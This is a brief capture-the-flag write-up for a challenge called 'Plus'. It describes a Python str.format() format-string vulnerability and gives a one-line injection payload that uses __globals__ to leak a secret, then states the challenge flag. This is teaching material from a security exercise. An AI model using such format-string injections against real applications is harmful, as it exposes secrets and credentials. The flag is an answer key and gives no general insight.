# Plus

## Write-up

there's a format string vulnerability , the attacker can inject a code to be formatted by the .format() method 

injecting :

```
1}{self.print_plus.__globals__[secret]
```

will print out the flag 

## Flag

`shellmates{AV01d_F0RM4T_$TrIng_MISTaKE$_1N_PYth0N!!!}`
